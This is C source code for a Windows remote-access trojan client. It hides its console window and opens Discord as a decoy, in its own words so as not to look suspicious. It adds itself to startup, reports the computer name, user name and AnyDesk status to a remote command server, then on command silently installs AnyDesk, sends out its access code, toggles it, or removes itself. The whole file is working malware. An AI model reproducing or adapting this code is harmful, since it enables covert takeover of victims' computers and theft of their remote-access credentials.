#include <stdio.h>
#include <Windows.h>
#include "CurlRequest.h"
#include "StartupRegister.h"
#include "AnyDeskFile.h"
#include "Helper.h"

// Functions
void connectToHost();
int getCommands();
int processCommand(int command);

// Global variables
int serverSocket;

void connectToHost()
{
    /*
    Connects to the server
    */

    struct Server server;
    struct sockaddr_in hostAddress;
    struct PcDetails pcDetails;
    WSADATA wsaData;
    int iResult;
    int isAnyDeskInstalledHtonl = 0, computername_lengthHtonl = 0, loggedUsername_lengthHtonl = 0;


    start:
        while (getIpAndPort(&server) != 0) {
            printf("Can't get ip and port, try again in 1 mintue...\n");
            Sleep(60000);
        }

        while (iResult = WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
        {
            printf("WSAStartup failed: %d, trying again in 1 minute...\n", iResult);
            Sleep(60000);
        }

        // Creates the socket
        serverSocket = socket(AF_INET, SOCK_STREAM, 0);
        while (serverSocket == -1)
        {
            printf("socket creation failed, trying again in 1 minutes \n");
            Sleep(60000);
            serverSocket = socket(AF_INET, SOCK_STREAM, 0);
        }
        printf("Socket successfully created..\n");

        // Defines the server IP & PORT
        hostAddress.sin_family = AF_INET;
        hostAddress.sin_addr.S_un.S_addr = inet_addr(server.IP);
        hostAddress.sin_port = htons(atoi(server.PORT));

        // Connects to the server
        while (connect(serverSocket, (struct sockaddr*)&hostAddress, sizeof(hostAddress)) != 0)
        {
            printf("connection with the server failed %d, trying again in 5 minues... \n", GetLastError());
            Sleep(300000);

            // ReDefines the server IP & PORT
            while (getIpAndPort(&server) != 0) {
                printf("Can't get ip and port, try again in 1 mintue...");
                Sleep(60000);
            }
            hostAddress.sin_family = AF_INET;
            hostAddress.sin_addr.S_un.S_addr = inet_addr(server.IP);
            hostAddress.sin_port = htons(atoi(server.PORT));
        }
        printf("connected to the server..\n");

        pcDetails = getPcDetails();
        isAnyDeskInstalledHtonl = htonl(pcDetails.isAnyDeskInstalled);
        computername_lengthHtonl = htonl(strlen(pcDetails.computerName));
        loggedUsername_lengthHtonl = htonl(strlen(pcDetails.userName));
      

        printf("Sending Computer Name...\n");
        
        // Sending computer name string length
        if (send(serverSocket, &computername_lengthHtonl, sizeof(computername_lengthHtonl), 0) == SOCKET_ERROR){
            printf("Can't sending computer name string length %d\n", GetLastError());
            printf("Reconnecting to server...\n");
            goto start;
        }
        
        // Sending actual computer name string
        if (send(serverSocket, pcDetails.computerName, strlen(pcDetails.computerName), 0) == SOCKET_ERROR) {
            printf("Can't sending computer name %d\n", GetLastError());
            printf("Reconnecting to server...\n");
            goto start;
        }

        // Sending logged logged user name string length
        if (send(serverSocket, &loggedUsername_lengthHtonl, sizeof(loggedUsername_lengthHtonl), 0) == SOCKET_ERROR) {
            printf("Can't sending logged user name string length %d\n", GetLastError());
            printf("Reconnecting to server...\n");
            goto start;
        }

        // Sending actual logged user name string
        printf("Sending Logged Username...\n");
        if (send(serverSocket, pcDetails.userName, strlen(pcDetails.userName), 0) == SOCKET_ERROR) {
            printf("Can't sending username %d\n", GetLastError());
            printf("Reconnecting to server...\n");
            goto start;
        }

        printf("Sending if anydesk install status...\n");
        if (send(serverSocket, &isAnyDeskInstalledHtonl, sizeof(isAnyDeskInstalledHtonl), 0) == SOCKET_ERROR) {
            printf("Can't anydesk install status %d\n", GetLastError());
            printf("Reconnecting to server...\n");
            goto start;
        }
}

int getCommands()
{
    /*
    Waits for the commands from the server and processes them

    return:
    0 - on sucess
    else - on error
    */

    int command = -1;

    while (true)
    {
        // Gets the command
        if (recv(serverSocket, (char *)&command, sizeof(command), 0) <= 0)
        {
            printf("Server connection has been closed!\n");
            return SOCKET_ERROR;
        }
        command = ntohl(command);
        if (processCommand(command) == SOCKET_ERROR)
        {
            return SOCKET_ERROR;
        }
    }
}

int processCommand(int command)
{
    /*
    Porcess [command]
    param 1: the command from the server

    return:
    0 - on sucess
    else - on error
    */

    switch (command)
    {
    case 0:
        if (installAnyDesk(serverSocket, anyDeskFilePath) == SOCKET_ERROR)
        {
            return SOCKET_ERROR;
        }
        break;

    case 1:
        if (sendCode(serverSocket) == SOCKET_ERROR)
        {
            return SOCKET_ERROR;
        }
        break;
    case 2:
        powerOnAnyDesk();
        break;
    case 3:
        powerOffAnyDesk();
        break;
    case 4:
        uninstallProgram();
        _close(serverSocket);
        exit(0);

    default:
        break;
    }

    return 0;
}

void checkIfProgramAlreadyRunning()
{
    CreateMutexA(0, FALSE, "Local\\$myprogram$"); // try to create a named mutex
    if (GetLastError() == ERROR_ALREADY_EXISTS)   // did the mutex already exist?
        // return -1; // quit; mutex is released automatically
        exit(1);
}

int main(int argc, char const *argv[])
{
    bool isThereError = false;

    hideConsoleWindow(); // Hides the console window

    ShellExecute(0, 0, L"https://discord.com/", 0, 0, SW_SHOW); // Opens discord to don't looks suspicios
    checkIfProgramAlreadyRunning();
    
    RegisterProgram(); // Registers the app to the startup
    setAnyDeskFilePath();
    
    if (isTheAnyDeskFile(anyDeskFilePath)) {
        _defineAnyDeskSettings();         
    }

    connectToHost();

    do
    {
        if (getCommands() == SOCKET_ERROR)
        {
            isThereError = true;
            printf("Restart socket connection...\n");
            connectToHost();
        }
    } while (isThereError);

    return 0;
}